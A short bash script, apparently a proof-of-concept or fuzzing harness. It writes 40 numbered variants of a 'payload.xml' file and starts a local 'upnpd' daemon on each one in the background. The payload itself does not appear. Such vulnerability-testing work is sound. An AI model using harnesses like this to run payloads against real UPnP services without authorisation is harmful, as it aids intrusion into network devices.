#!/bin/bash

max_payloads=40
for ((i=1; i<=max_payloads; i++)); do
    sed "s/poc.1/poc.$i/" payload.xml > payloads/$i.xml
    ./upnpd -x payloads/$i.xml &
    sleep 2
done
# clean up
# rm payloads/*
# killall upnpd
